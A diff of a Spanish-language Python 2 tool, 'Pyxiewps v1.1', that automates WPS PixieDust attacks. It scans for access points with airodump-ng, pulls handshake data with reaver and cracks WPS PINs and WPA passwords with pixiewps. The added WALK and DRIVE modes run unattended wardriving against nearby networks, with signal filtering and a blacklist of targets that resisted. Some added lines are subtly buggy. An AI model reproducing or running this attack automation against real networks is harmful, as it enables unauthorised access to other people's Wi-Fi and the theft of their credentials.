@@ -1,27 +1,31 @@
+# -*- coding: utf-8 -*-
+
 from os import kill, system, path, chdir
 from signal import alarm, signal, SIGALRM, SIGKILL
 import time
 import subprocess
 from re import sub, compile, search
 from sys import argv
+import datetime
 
 REAVER = 'reaver'
 PIXIEWPS = 'pixiewps'
-WASH = 'wash'
-MACCHANGER = 'macchanger'
+AIRMON = 'airmon-ng'
 GIT = 'git'
 INFO = '\033[32m[+] \033[0m'   # Verde
 ALERTA = '\033[31m[!] \033[0m' # Rojo
 INPUT = '\033[34m[>] \033[0m'  # Azul
 DATA = '\033[33m[DATA] \033[0m'  #Amarillo
 OPCION = '\033[33m[!!!] \033[0m' #Amarillo
-USE_REAVER = False   # Si False usa wash y termina.
+SEPARADOR = '*'*70+'\n'
 USE_PIXIEWPS = False # Intenta averiguar el pin WPS con pixiewps
-WASH_TIME = 14       # Tiempo para que wash recopile APs con WPS
-WASH_CHANNEL = ''    # Todos
+AIRODUMP_TIME = 3    # Tiempo para que airodump recopile APs con WPS
+RSSI = -100          # Calidad
+CHANNEL = ''         # Todos
 REAVER_TIME = 6      # Tiempo para que reaver recopile la informacion
 CHOICES_YES = ['S', 's', '', 'si', 'Si']
 CHOICES_NOPE = ['N', 'n', 'no', 'No']
+blacklist = [] # Lista negra de BSSIDs a las que no se ha podido atacar y no tiene sentido volver a hacerlo
 PROMPT_APS = False
 OUTPUT = False
 OUTPUT_FILE = 'data.txt'
@@ -29,7 +33,10 @@ PRINT_REAVER = True
 PRINT_PIXIE = True
 GET_PASSWORD = False
 FOREVER = False
-OVERRIDE = False
+OVERRIDE = True
+BLACKLIST = True
+MAX_APS = 'All'
+USE_MODES = False
 
 def banner():
   """
@@ -39,16 +46,16 @@ def banner():
   print
   print "\t ____             _                         "
   print "\t|  _ \ _   ___  _(_) _____      ___ __  ___ "
-  print "\t| |_) | | | \ \/ / |/ _ \ \ /\ / / \'_ \/ __|"
+  print "\t| |_) | | | \ \/ / |/ _ \ \ /\ / / '_ \/ __|"
   print "\t|  __/| |_| |>  <| |  __/\ V  V /| |_) \__ \\"
   print "\t|_|    \__, /_/\_\_|\___| \_/\_/ | .__/|___\\"
   print "\t       |___/                     |_|        "
   print
-  print "\tHecho por jgilhutton"
+  print "\tPyxiewps v1.1 por jgilhutton"
   print "\tReaver 1.5.2 mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212 & Wiire & kib0rg"
-  print "\tCopyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>"
+  print "\t Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>"
   print "\tPixiewps  Copyright (c) 2015, wiire <wi7ire@gmail.com>"
-  print "\tMacchanger por Alvaro Ortega Copyright (C) 2003 Free Software Foundation, Inc."
+  print "\tAircrack www.aircrack-ng.org"
   print
   
 def arg_parser():
@@ -58,19 +65,24 @@ def arg_parser():
  
   global PRINT_PIXIE
   global PRINT_REAVER
-  global USE_REAVER
   global USE_PIXIEWPS
-  global WASH_TIME
+  global AIRODUMP_TIME
   global REAVER_TIME
-  global WASH_CHANNEL
+  global CHANNEL
   global PROMPT_APS
   global OUTPUT_FILE
   global OUTPUT
   global GET_PASSWORD
   global FOREVER
   global OVERRIDE
+  global BLACKLIST
+  global RSSI
+  global MAX_APS
+  global USE_MODES
   H = ['-h','--help']
-  binary_flags = ['-w','-t','-c','-o']
+  flags = ['-p','-P','-f','-q','-F','-A']
+  binary_flags = ['-a','-t','-c','-o','-s','-m','-M',
+		  '--max-aps','--rssi','--airodump-time','--tiempo','--canal','--output','--modo']
   
   for arg in argv[1:]:
     if arg in H:
@@ -78,41 +90,87 @@ def arg_parser():
       exit()
     elif argv[argv.index(arg)-1] in binary_flags:
       continue
+    elif arg == '-m' or arg == '--modo':
+      USE_MODES = True
+      modo = argv[argv.index(arg)+1]
+      if modo == 'WALK':
+	USE_PIXIEWPS = True
+	AIRODUMP_TIME = 4
+	REAVER_TIME = 8
+	GET_PASSWORD = True
+	FOREVER = True
+	MAX_APS = 2
+      elif modo == 'DRIVE':
+	USE_PIXIEWPS = True
+	REAVER_TIME = 10
+	FOREVER = True
+	MAX_APS = 1
+      elif modo == 'STATIC':
+	USE_PIXIEWPS = True
+	AIRODUMP_TIME = 5
+	REAVER_TIME = 10
+	GET_PASSWORD = True
+	PROMPT_APS = True
+	OVERRIDE = False
+      else:
+	print ALERTA + "No se reconocio el modo %s." %modo
+	print "    Revise la ayuda para ver que modos disponibles hay."
+	help()
+    elif arg == '-M' or arg == '--max-aps':
+      try:
+	MAX_APS == int(argv[argv.index(arg)+1])
+      except ValueError:
+	help()
+    elif arg == '-s' or arg == '--rssi':
+      try:
+	RSSI = int(argv[argv.index(arg)+1])
+	if RSSI < -100 or RSSI > 0: help()
+      except ValueError:
+	help()
     elif arg == '-q' or arg == '--quiet':
       PRINT_PIXIE = False
       PRINT_REAVER = False
-    elif arg == '-r' or arg == '--use-reaver':
-      USE_REAVER = True
     elif arg == '-p' or arg == '--use-pixie':
       USE_PIXIEWPS = True
-    elif arg == '-w' or arg == '--wash-time':
+    elif arg == '-a' or arg == '--airodump-time':
       try:
-	WASH_TIME = int(argv[argv.index(arg)+1])
+	AIRODUMP_TIME = int(argv[argv.index(arg)+1])
+	if REAVER_TIME <= 0: help()
       except ValueError:
 	help()
     elif arg == '-t' or arg == '--tiempo':
       try:
 	REAVER_TIME = int(argv[argv.index(arg)+1])
+	if REAVER_TIME <= 0: help()
       except ValueError:
 	help()
     elif arg == '-c' or arg == '--canal':
       try:
-	WASH_CHANNEL = int(argv[argv.index(arg)+1])
+	CHANNEL = int(argv[argv.index(arg)+1])
+	if CHANNEL <= 0 or CHANNEL >= 15: help()
       except ValueError:
 	help()
     elif arg == '-P' or arg == '--prompt':
       PROMPT_APS = True
     elif arg == '-o' or arg == '--output':
       OUTPUT = True
-      OUTPUT_FILE = argv[argv.index(arg)+1]
+      try:
+	m = argv[argv.index(arg)+1]
+	if m not in flags:
+	  if file not in binary_flags: OUTPUT_FILE = file
+      except IndexError:
+	pass
     elif arg == '-f' or arg == '--pass':
       GET_PASSWORD = True
     elif arg == '-F' or arg == '--forever':
       FOREVER = True
-    elif arg == '-O' or arg == '--override':
-      OVERRIDE = True
+    elif arg == '-A' or arg == '--again':
+      OVERRIDE = False
+      BLACKLIST = False
     else:
       help()
+    if CHANNEL != '':
+      AIRODUMP_TIME = 1
 
 def help():
   """
@@ -120,28 +178,70 @@ def help():
   """
   
   print
-  print "script -r -p -w 15 -t 6 -c 7 -P -o file.txt -f"
-  print "script --use-reaver --use-pixie --wash-time 15 --tiempo 6 --canal 7 --prompt --output file.txt -h"
+  print '  Ejemplos:'
   print
-  print '\t-r --use-reaver          Captura la informacion del AP con Reaver.              [False]'
-  print '\t-p --use-pixie           Una vez que captura la informacion con Reaver          [False]'
-  print '\t                         intenta sacar el pin WPS del router.'
-  print '\t-w --wash-time [tiempo]  Setea el tiempo que va a usar para enumerar los        [15]'
-  print '\t                         ap con WPS.'
-  print '\t-t --tiempo [tiempo]     Setea el tiempo que va a usar para recolectar la       [6]'
-  print '\t                         informacion del AP.'
-  print '\t-c --canal [canal]       Proporciona el canal en el que escucha para enumerar'
-  print '\t                         los AP con WPS. Si no se usa, se escanean todos los canales.'
-  print '\t-P --prompt              Si se encuentra mas de un AP con WPS, preguntar a cual [False]'
-  print '\t                         se quiere atacar.'
-  print '\t-o --output [archivo]    Graba los datos en un archivo de texto.'
-  print '\t-f --pass                Si se tiene exito al averiguar el pin WPS, tambien'
-  print '\t                         tratar de averiguar la clave WPA.'
-  print '\t-q --quiet               No muestra la informacion recopilada.'
-  print '\t-F --forever             Corre el programa indefinidamente hasta que se lo interrumpa'
-  print '\t-O --override            Vuelve a atacar APs con pines que ya han sido conseguidos'
-  print '\t                         sin preguntar.'
+  print "\tpyxiewps -p -t 6 -c 7 -P -o file.txt -f"
+  print "\tpyxiewps --use-pixie -s -70 --tiempo 6 --canal 7 --prompt --output file.txt"
+  print "\tpyxiewps -m STATIC"
+  print "\tpyxiewps --modo DRIVE"
   print
+  print '  Opciones individuales:'
+  print
+  print '\t-p --use-pixie               Una vez que captura la informacion con Reaver          [False]'
+  print '\t                             intenta sacar el pin WPS del router.'
+  print '\t-a --airodump-time [tiempo]  Setea el tiempo que va a usar para enumerar los        [3]'
+  print '\t                             ap con WPS.'
+  print '\t-t --tiempo [tiempo]         Setea el tiempo que va a usar para recolectar la       [6]'
+  print '\t                             informacion del AP.'
+  print '\t-c --canal [canal]           Proporciona un canal entre 1 y 14 en el que escucha para enumerar'
+  print '\t                             los AP con WPS. Si no se usa, se escanean todos los canales.'
+  print '\t-P --prompt                  Si se encuentra mas de un AP con WPS, preguntar a cual [False]'
+  print '\t                             se quiere atacar. Si el pin WPS ya fue conseguido pregunta para'
+  print '\t                             atacar denuevo'
+  print '\t-o --output [archivo]        Graba los datos en un archivo de texto.'
+  print '\t-f --pass                    Si se tiene exito al averiguar el pin WPS, tambien'
+  print '\t                             tratar de averiguar la clave WPA.'
+  print '\t-q --quiet                   No muestra la informacion recopilada.'
+  print '\t-F --forever                 Corre el programa indefinidamente hasta que se lo interrumpa'
+  print '\t-A --again                   Vuelve a atacar APs con pines que ya han sido conseguidos'
+  print '\t                             sin preguntar.'
+  print '\t-s --signal [-NUMERO]        No se tendran en cuenta redes con una calidad menor a  [-100]'
+  print '\t                             NUMERO. Un valor de "-50" obviara las redes con calidad'
+  print '\t                             desde -100 a -51 y atacara las que van desde -50 a 0'
+  print '\t-M --max-aps [numero]        Establece una cantidad maxima de APs que se van a atacar.'
+  print '\t-m --modo [modo]             Establece un modo predeterminado para usar. Cualquier opcion'
+  print '\t                             prestablecida podra ser estipulada manualmente con su'
+  print '\t                             correspondiente argumento, por ejemplo: "-m DRIVE -t 10"'
+  print
+  print '  Modos disponibles:'
+  print
+  print '\tWALK:'
+  print '\t\t[-p] [-f] [-a 4] [-t 8] [-F] [-M 2]'
+  print '\t\tSe intentara averiguar el pin WPS'
+  print '\t\tSe usaran 4 segundos para enumerar APs'
+  print '\t\tSe usaran 8 segundos para recuperar la informacion necesaria de cada AP'
+  print '\t\tSe intentara averiguar la contrasenia'
+  print '\t\tEl programa se ejecutara hasta que el usuario lo interrumpa'
+  print '\t\tSe atacaran como maximo 2 objetivos'
+  print '\t\tSe saltearan APs cuyo ataque haya sido negativo'
+  print '\tDRIVE:'
+  print '\t\t[-p] [-t 10] [-F] [-M 1]'
+  print '\t\tSe intentara averiguar el pin WPS'
+  print '\t\tSe usaran 3 segundos para enumerar APs'
+  print '\t\tSe usaran 10 segundos para recuperar la informacion necesaria del AP'
+  print '\t\tNo se intentara averiguar la contrasenia'
+  print '\t\tEl programa se ejecutara hasta que el usuario lo interrumpa'
+  print '\t\tSe atacara solo un objetivo'
+  print '\t\tSe saltearan APs cuyo ataque haya sido negativo'
+  print '\tSTATIC:'
+  print '\t\t[-p] [-f] [-a 5] [-t 10] [-P] [-O]'
+  print '\t\tSe intentara averiguar el pin WPS'
+  print '\t\tSe usaran 5 segundos para enumerar APs'
+  print '\t\tSe usaran 10 segundos para recuperar la informacion necesaria de cada AP'
+  print '\t\tSe intentara averiguar la contrasenia'
+  print '\t\tEl programa se ejecutara solo una vez'
+  print '\t\tSe preguntara por el objetivo a atacar'
+  print '\t\tNo se saltearan APs cuyo ataque haya sido negativo'
   exit()
   
 class Engine():
@@ -152,9 +252,7 @@ class Engine():
   def __init__(self):
     self.REAVER = True
     self.PIXIEWPS = True
-    self.WASH = True
     self.AIRMON = True
-    self.MACCHANGER = True
     self.GIT = True
   
   def start(self):
@@ -167,6 +265,7 @@ class Engine():
     else:
       print INFO + "Se encontro una interfaz en modo monitor: %s" %c.IFACE_MON
       choice = raw_input("%sDesea usar esta interfaz? [S/n] " %INPUT)
+      print
       if choice in CHOICES_YES:
 	pass
       elif choice in CHOICES_NOPE:
@@ -180,20 +279,7 @@ class Engine():
       attack = Attack()
       attack.get_wps_aps()
       engine.exit_limpio()
-    
-  def parse_wash(self, linea):
-    """
-    Analiza el output del wash
-    linea viene sin el salto de linea, separando las cosas con "|"
-    Devuelve bssid, canal, essid e instancia de Target
-    """
-    
-    linea = linea.split('|')
-    bssid = linea[0] # MAC
-    canal = linea[1]
-    essid = linea[-1]
-    return [bssid, canal, essid]
-    
+
   def parse_reaver(self, output, pin_encontrado = False):
     """
     Analiza el output del reaver
@@ -267,13 +353,56 @@ class Engine():
 	ESSID = ESSID.split('|')[-1][:-2]
       elif '[+] Waiting for beacon from ' in linea:
 	BSSID = sub('\[\+\] Waiting for beacon from ','',linea)
-      else:
-	pass
+
     uberlista = [PKE.strip(),PKR.strip(),HASH1.strip(),HASH2.strip(),AUTHKEY.strip(),
     MANUFACTURER.strip(),MODEL.strip(),NUMBER.strip(),E_NONCE.strip(),R_NONCE.strip(),
     ESSID.strip(),BSSID.strip()]
     return uberlista
   
+  def parse_airodump(self, input):
+    """
+    Analiza el output de airodump
+    y devueve ESSIDs, WPSstatus, canal, bssid y senial
+    """
+
+    plist = []
+    input.reverse() # MUY IMPORTANTE
+    inds = [47,73,86] # indices para CANAL, WPS, ESSID
+    if CHANNEL != '': inds = [i+4 for i in inds]
+    for linea in input:                              # Elimina los clientes que aparecen en el dump
+      if 'Probe' in linea:                           # del airodump para que no interfieran en el parser
+	input = input[(input.index(linea)+1):]       # 'Probe' aparece en la lista de clientes nada mas
+	break                                        #
+    for i in input:
+      if "][ Elapsed:" not in i and ":" in i and "<length:" not in i:
+	#print i
+	i = i.lstrip().strip()
+	snowden = i[inds[1]:]
+	try:
+	  wps = snowden[0:snowden.index('  ')].strip()
+	  essid = snowden[(snowden.index('  ')+2):].lstrip()
+	except IndexError: # Por el '  '
+	  continue
+	canal = i[inds[0]:inds[0]+2].lstrip()
+	bssid = i[0:17]
+	rssi = i[19:22]
+	try:
+	  if bssid not in blacklist and wps != '' and '0.0' not in wps and int(i[1]) >= RSSI:
+	    a = '%s|%s|%s|%s|%s|%s' %(bssid,canal.zfill(2),rssi,wps,wps,essid)
+	    plist.append(a)
+	except:
+	  return plist
+      elif "][ Elapsed:" in i:
+	break
+    plist.sort(key=lambda x: int(x[21:24]), reverse = True) # Ordena la lista de mayor a menor RSSI.
+    if MAX_APS != 'All':
+      try:
+	return plist[0:MAX_APS]
+      except IndexError:
+	return plist
+    if MAX_APS == 'All': # Con un else se hace pero lo hago por el bien de la lectura
+      return plist
+
   def check(self, check_again = False):
     """
     Chequea dependencias, el usuario que ejecuta el programa y otras weas
@@ -283,15 +412,15 @@ class Engine():
       print ALERTA + 'Necesita ejecutar este programa como superusuario'
       exit()
 
+    size = c.screen_size()
+    if size < 110:
+      print
+      print ALERTA + "El tamaño de la consola en la que se esta ejecutando"
+      print "    el programa debe ser mayor. Por favor agrande la consola y"
+      print "    vuelva a ejecutar el programa."
+      exit()
+
     ### Programas
-    if c.program_exists(MACCHANGER):
-      self.MACCHANGER = True
-    elif not check_again:
-      print ALERTA + 'macchanger no esta instalado pero no es vital para el programa.'
-      print '    Algunos APs bloquean la MAC del dispositivo con el que se ataca y'
-      print '    cambiar la MAC es una buena solucion para desviar el problema.'
-      print '    Si no se tiene macchanger el programa fallara en recolectar la informacion.'
-      self.MACCHANGER = False
     if c.program_exists(REAVER):
       version = c.check_reaver_version()
       if version == '1.5.2':
@@ -307,16 +436,16 @@ class Engine():
     elif not check_again:
       print ALERTA + 'pixiewps no esta instalado'
       self.PIXIEWPS = False
-    if c.program_exists(WASH):
-      self.WASH = True
+    if c.program_exists(AIRMON):
+      self.AIRMON = True
     elif not check_again:
-      print ALERTA + 'wash no esta instalado'
-      self.WASH = False
+      print ALERTA + 'airmon-ng no esta instalado'
+      self.AIRMON = False
     if c.program_exists(GIT):
       self.GIT = True
     elif not check_again:
       self.GIT = False
-    if self.REAVER and self.WASH and self.PIXIEWPS and check_again:
+    if self.REAVER and self.AIRMON and self.PIXIEWPS and check_again:
       print INFO + "Todos los programas se instalaron correctamente."
       raw_input("%sPresione enter para continuar" %INPUT)
       print INFO + "Empezando el ataque..."
@@ -327,9 +456,7 @@ class Engine():
       print "    y luego de instalarlas, ejecute otra vez el programa."
       print
       exit()
-    if self.REAVER and self.AIRMON and self.WASH and self.PIXIEWPS:
-      pass
-    else:
+    if not (self.REAVER and self.AIRMON and self.PIXIEWPS):
       print ALERTA + "Necesita tener todos los programas necesarios."
       print INPUT + "Las dependencias son:"
       print "\tbuild-essential"
@@ -347,7 +474,7 @@ class Engine():
     ###Todo en orden...
     engine.start()
 
-  def run(self, cmd, shell = False, kill_tree = True, timeout = -1):
+  def run(self, cmd, shell = False, kill_tree = True, timeout = -1, airodump = False):
     """
     Ejecuta un comando durante un tiempo determinado que,
     transcurrido, es terminado. Devuelve el stdout del proc.
@@ -358,17 +485,25 @@ class Engine():
       pass
     def alarm_handler(signum, frame):
       raise Alarm
+    output = []
     if timeout != -1:
       signal(SIGALRM, alarm_handler) # Empieza a correr el tiempo
       alarm(timeout)                 # Si se acaba levanta una alarma
-
-    proc = subprocess.Popen(cmd, shell = shell, stdout = subprocess.PIPE)
-    output = []
+    if airodump:
+      proc = subprocess.Popen(cmd, shell = shell, stderr = subprocess.PIPE)
+    else:
+      proc = subprocess.Popen(cmd, shell = shell, stdout = subprocess.PIPE)
     try:
-      for line in iter(proc.stdout.readline, ''):
-	output.append(line)
-      if timeout != -1:
-	alarm(0)
+      if airodump:
+	for line in iter(proc.stderr.readline, ''):
+	  output.append(line)
+	if timeout != -1:
+	  alarm(0)
+      else:
+	for line in iter(proc.stdout.readline, ''):
+	  output.append(line)
+	if timeout != -1:
+	  alarm(0)
     except Alarm:         # El tiempo acaba y se produce una alarma
       pids = [proc.pid]   # Se matan los procesos relacionados con proc.
       if kill_tree:
@@ -390,26 +525,6 @@ class Engine():
     proc = subprocess.Popen('ps --no-headers -o pid --ppid %d' % pid, shell = True, stdout = subprocess.PIPE)
     stdout = proc.communicate()[0]
     return [int(p) for p in stdout.split()]
-
-  def mac_changer(self):
-    """
-    Cambia la MAC del dispositivo ante un bloqueo del AP
-    """
-    
-    print INFO + "Cambiando direccion MAC del dispositivo..."
-    system('ifconfig %s down' %c.IFACE_MON)
-    system('iwconfig %s mode Managed' %c.IFACE_MON)
-    system('ifconfig %s up' %c.IFACE_MON)
-    system('ifconfig %s down' %c.IFACE_MON)
-    mac = subprocess.check_output(['macchanger','-r',c.IFACE_MON])
-    mac = mac.split('\n')[2]
-    mac = sub('New       MAC\: ','',mac.strip())
-    mac = sub(' \(unknown\)','',mac)
-    system('ifconfig %s up' %c.IFACE_MON)
-    system('ifconfig %s down' %c.IFACE_MON)
-    system('iwconfig %s mode monitor' %c.IFACE_MON)
-    system('ifconfig %s up' %c.IFACE_MON)
-    print INFO + "Se cambio la MAC a una nueva: %s%s" %(INPUT,mac.upper())
     
   def exit_limpio(self):
     """
@@ -423,7 +538,7 @@ class Engine():
 	system('cd /root && rm -r pixiewps/ && rm -r reaver-wps-fork-t6x/')
     if c.IS_MON:
       c.set_iface("DOWN")
-    if USE_REAVER:
+      system('pkill airodump')
       system('rm -f /usr/local/etc/reaver/*.wpc')
     exit()
 
@@ -436,6 +551,13 @@ class Config():
   IFACE = 'caca'
   IS_MON = False
   
+  def screen_size(self):
+    """
+    Devuelve el ancho de la consola en que se ejecuta el programa
+    """
+    
+    return int(subprocess.check_output(['stty','size']).split()[1])
+
   def program_exists(self, programa):
     """
     Chequea si existe el programa que se le
@@ -513,10 +635,8 @@ class Config():
 	    self.IFACE = ifaces[choice]
 	    return ifaces[choice]
 	    break
-	  except IndexError:
-	    print ALERTA + "Inserte un numero entre 0 y %s" %(len(ifaces)-1) #Maneja el error de indice
-	  except ValueError:
-	    print ALERTA + "Inserte un numero entre 0 y %s" %(len(ifaces)-1) #Por si le mandas letras y no #s
+	  except (IndexError, ValueError):
+	    print ALERTA + "Inserte un numero entre 0 y %s" %(len(ifaces)-1) #Maneja el error
 	  except KeyboardInterrupt:
 	    print 
 	    print ALERTA + "Programa interrumpido"
@@ -548,19 +668,19 @@ class Config():
       system('ifconfig %s up' %(self.IFACE))
       self.IFACE_MON = self.IFACE
       self.IS_MON = True
-      print INFO + "%s corriendo en modo monitor" %self.IFACE
-
+      print INFO + "%s corriendo en modo monitor" %self.IFACE_MON
+      print
+      
   def data_file(self, data):
     """
     Guarda la informacion en un archivo
     """
     system('echo INFORMACION >> %s' %OUTPUT_FILE)
     with open(OUTPUT_FILE, 'a+') as f:
-      fecha = str(time.gmtime()[1])+'-'+str(time.gmtime()[2])+'-'+str(time.gmtime()[0])
-      hora = str((time.gmtime()[3])-3).zfill(2)+':'+str(time.gmtime()[4]).zfill(2)
-      f.write(fecha+' | '+hora+'\n')
+      date = str(datetime.datetime.now())
+      f.write(date+'\n')
       f.writelines(data)
-    print INFO + "Se guardo la informacion en el archivo %s. Buscala en /root." %OUTPUT_FILE
+    print INFO + "Se guardo la informacion en el archivo %s" %OUTPUT_FILE
     
   def get_binarios(self):
     """
@@ -570,6 +690,7 @@ class Config():
     git = 'apt-get -y install git'
     reaver_dep = 'apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng'
     pixie_dep = 'sudo apt-get -y install libssl-dev'
+    reaver_apt = 'apt-get -y install reaver'
     reaver = 'git clone https://github.com/t6x/reaver-wps-fork-t6x.git'
     pixiewps = 'git clone https://github.com/wiire/pixiewps.git'
     aircrack = 'apt-get -y install aircrack-ng'
@@ -588,7 +709,10 @@ class Config():
       print INFO + "Instalando las dependencias de reaver..."
       proc = system(reaver_dep)
       print INFO + "Descargando reaver..."
-      proc1 = system(reaver)
+      if 'kali' in subprocess.check_output('uname -a', shell = True):
+	proc1 = system(reaver_apt)
+      else:
+	proc1 = system(reaver)
     if path.isdir('pixiewps') and not engine.PIXIEWPS:
       print INFO + "Instalando pixiewps..."
       system('cd pixiewps/src && make && make install')
@@ -626,18 +750,15 @@ class Attack():
     Crea las instancias de Target.
     Pasa a get_reaver_info
     """
-    
+
     print INFO + "Enumerando APs con WPS activado..."
-    cmd = 'wash -i %s -P' %(c.IFACE_MON)
-    if WASH_CHANNEL != '':
-      cmd = cmd + ' -c %d' %WASH_CHANNEL
-    lista_aps = engine.run(cmd, shell = True, timeout = WASH_TIME)
-    lista_provisoria = []
+    cmd = 'airodump-ng -c 1-11 --wps %s' %(c.IFACE_MON)
+    if CHANNEL != '':
+      cmd = 'airodump-ng -c %d --wps %s' %(CHANNEL, c.IFACE_MON)
+    output = engine.run(cmd, shell = True, timeout = AIRODUMP_TIME, airodump = True)
+    lista_aps = engine.parse_airodump(output)
     ultimo = len(lista_aps)-1
-    for linea in lista_aps:             # Esto se tiene que hacer por irregularidades ocasionales
-      if '|' in linea:                  # en el output del wash.
-	lista_provisoria.append(linea)  #
-    lista_aps = lista_provisoria        #
+    
     if lista_aps == []:
       print
       print ALERTA + "No se encontraron APs con WPS activado."
@@ -649,60 +770,62 @@ class Attack():
       essids = []                                                       #|
       for line in for_fill:                                             #|- Para que quede mas linda la lista
 	line = line.split('|')                                          #|- de los APs.
-	essids.append(line[5].strip())                                  #|
+	essids.append(line[5])                                          #|
       fill = len(max(essids))                                           #/
       print INFO + "Se encontraron los siguientes APs con WPS activado:"
       for linea in lista_aps:
 	linea = linea.split('|')
-	fill_line = fill - len(linea[5].strip())
-	print '\t' + INPUT + str(linea[5].strip()) + ' '*fill_line + ' || ' + linea[0] + ' || Canal: ' + linea[1] + ' || WPS locked?: ' + linea[4]
-      if USE_REAVER:
-	while True:
-	  try:
-	    if len(lista_aps) != 1 and PROMPT_APS: 
-	      choice = int(raw_input("%sProporcione el inice del AP: " %INPUT))
+	fill_line = fill - len(linea[5])
+	print '\t' + INPUT + str(linea[5]) + ' '*fill_line + ' || ' + linea[0] + ' || Canal: ' + linea[1] + ' || RSSI: ' + linea[2] + ' || WPS: ' + linea[4]
+      while True:
+	try:
+	  if len(lista_aps) != 1 and PROMPT_APS: 
+	    choice = raw_input("%sProporcione el inice del AP o presione ENTER para elegir todos: " %INPUT)
+	    if choice == '':
+	      break
+	    else:
+	      choice = int(choice)
 	      provisoria = []
 	      provisoria.append(lista_aps[choice])
 	      lista_aps = provisoria
 	      break
-	    else:
-	      break
-	  except KeyboardInterrupt:
-	    print
-	    engine.exit_limpio()
+	  else:
 	    break
-	  except ValueError:
-	    print ALERTA + "Proporcione un numero entre 0 y %d" %ultimo
-	if not OVERRIDE and path.isfile('pyxiewpsdata.txt'):
-	  coincidencias = []
-	  pin_correspondiente = []
-	  with open('pyxiewpsdata.txt') as f:
-	    ya_sacados = f.readlines()
-	  if len(ya_sacados) > 1:
-	    ya_sacados.reverse() # Se revierte para tomar el pin mas actualizado ante un posible
-	    for target in lista_aps: # cambio del pin WPS.
-	      for line in ya_sacados[1:]:
-		if target.split('|')[5].strip() == line.strip():
-		  coincidencias.append(target)
-		  pin_correspondiente.append(ya_sacados[ya_sacados.index(line)-1].strip())
-	    for i in set(coincidencias):
-	      print OPCION + "El pin de %s ya ha sido averiguado: " %i.split('|')[5].strip()
-	      print '\t'+ INPUT + pin_correspondiente[coincidencias.index(i)]
-	      print OPCION + "Desea saltearlo? [S/n]: "
-	      try:
-		choice = raw_input("%s Enter para saltear: " %INPUT)
-	      except KeyboardInterrupt:
-		print
-		engine.exit_limpio()
-	      if choice in CHOICES_YES:
-		lista_aps.remove(i)
-	for linea in lista_aps:
-	  args = engine.parse_wash(linea.strip())
-	  self.get_reaver_info(args[0],args[1],args[2])
-	if not FOREVER:
+	except KeyboardInterrupt:
+	  print
 	  engine.exit_limpio()
-	else:
-	  pass
+	  break
+	except (ValueError, IndexError):
+	  print ALERTA + "Proporcione un numero entre 0 y %d" %ultimo
+      if path.isfile('pyxiewpsdata.txt'):
+	coincidencias = []
+	pin_correspondiente = []
+	with open('pyxiewpsdata.txt') as f:  # Revisa si el AP ya ha sido atacado con exito
+	  ya_sacados = f.readlines()
+	if len(ya_sacados) > 1:
+	  ya_sacados.reverse()  # Se revierte para tomar el pin mas actualizado ante un posible cambio del pin WPS.
+	  for target in lista_aps:
+	    for line in ya_sacados[1:]:
+	      if target.split('|')[5] == line.strip():
+		coincidencias.append(target)
+		pin_correspondiente.append(ya_sacados[ya_sacados.index(line)-1].strip())
+	  for i in set(coincidencias):
+	    print OPCION + "El pin de %s ya ha sido averiguado: " %i.split('|')[5]
+	    print '\t'+ INPUT + pin_correspondiente[coincidencias.index(i)]
+	    if not OVERRIDE:
+	      print INFO + "Se atacara otra vez como se pidio."
+	      print
+	    else:
+	      print INFO + "Se saltea para siempre."
+	      lista_aps.remove(i) # Se elimina de la lista de objetivos
+	      blacklist.append(i[:17])
+	      print
+      for linea in lista_aps: # for-loop principal del programa hasta que pruebe el multithread
+	linea = linea.split('|')
+	self.get_reaver_info(linea[0],linea[1],linea[5])
+	print SEPARADOR
+      if not FOREVER:
+	engine.exit_limpio()
   
   def get_reaver_info(self, bssid, canal, essid):
     """
@@ -710,9 +833,9 @@ class Attack():
     el ataque PixieDust. PKR, PKE, HASH1, HASH2, AUTHKEY
     Actua dentro del for-loop de get_wps_aps
     """
-
+    
     print INFO + "Recopilando informacion de %s con reaver..." %essid
-    output = engine.run(cmd=['reaver','-i',c.IFACE_MON,'-b',bssid,'-vvv','-L','-c',canal], timeout = REAVER_TIME)
+    output = engine.run(cmd=['reaver','-i',c.IFACE_MON,'-b',bssid,'-vvv','-P','-l', '1','-c',canal], timeout = REAVER_TIME)
     data = engine.parse_reaver(output)
     if data == 'noutput':
       print
@@ -721,16 +844,6 @@ class Attack():
       print "    y si aun no se puede obtener la informacion"
       print "    mejore la recepcion de su interfaz"
       print
-      if MACCHANGER and FOREVER:
-	engine.mac_changer()
-      elif MACCHANGER and not FOREVER:
-	print ALERTA + "No se cambia la MAC porque se ejecuto una sola vez"
-	print "    Corra el programa con el argumento -F para correr indefinidamente"
-	print
-      elif not MACCHANGER:
-	print ALERTA + "No se puede cambiar la MAC del dispositivo"
-	print "    porque no se tiene macchanger instalado."
-	print
     elif data == 'more time please':
       print
       print ALERTA + "El programa obtuvo alguna informacion pero no alcanzo"
@@ -741,17 +854,12 @@ class Attack():
       print
       print ALERTA + "Al AP no le gustan los ataques de WPS"
       print "    por lo tanto no se pudo recopilar la informacion"
+      if BLACKLIST:
+	blacklist.append(bssid)
+	print INFO + "%s no se volvera a atacar." %essid
+      else:
+	print "    pero %s se volvera a atacar como se pidio." %essid
       print
-      if MACCHANGER and FOREVER:
-	engine.mac_changer()
-      elif MACCHANGER and not FOREVER:
-	print ALERTA + "No se cambia la MAC porque se ejecuto una sola vez"
-	print "    Corra el programa con el argumento -F para atacar indefinidamente"
-	print
-      elif not MACCHANGER:
-	print ALERTA + "No se puede cambiar la MAC del dispositivo"
-	print "    porque no se tiene macchanger instalado."
-	print
     elif data == 'cacota':
       print
       print "Seleccione una opcion de sesion para reaver"
@@ -797,15 +905,13 @@ class Attack():
     output = []
     for command in cmd_list:
       try:
-	output = subprocess.check_output(command)
-	output = output.strip().split('\n')
+	output = engine.run(command, timeout = 2)
+	output = [i.strip() for i in output]
 	for linea in output:
 	  if '[+] WPS pin:' in linea:
 	    result = compile('\d+')
 	    pin = result.search(linea).group(0)
 	    break
-	  else:
-	    pass
       except:             #Tengo que manejar un posible error del Pixie
 	pass
       if pin != '': break
@@ -823,7 +929,7 @@ class Attack():
       print "    Es posible que el AP no sea vulnerable al"
       print "    ataque PixieDust y nunca lo sea"
       print
-      
+      blacklist.append(BSSID)
     if GET_PASSWORD and pin != '':
       self.get_password(for_file, BSSID, pin, canal)
     elif OUTPUT:
@@ -835,7 +941,7 @@ class Attack():
